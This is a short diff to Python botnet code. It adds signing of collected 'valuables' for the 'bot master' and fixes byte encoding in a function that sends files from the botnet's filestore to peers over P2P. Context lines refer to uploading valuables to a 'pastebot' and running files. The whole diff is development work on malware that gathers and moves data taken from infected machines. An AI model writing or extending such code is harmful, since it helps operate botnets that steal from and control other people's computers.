@@ -1,5 +1,9 @@
 import os
 
+from auth.master_sign import sign_file
+from auth.master_view import decrypt_valuables
+
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -13,6 +17,7 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
+    data = sign_file(data)
     return data
 
 def upload_valuables_to_pastebot(fn):
@@ -78,7 +83,7 @@ def p2p_upload_file(sconn, fn):
         print("That file doesn't exist in the botnet's filestore")
         return
     print("Sending %s via P2P" % fn)
-    sconn.send(fn)
+    sconn.send(bytes(fn, "ascii"))
     sconn.send(filestore[fn])
 
 def run_file(f):
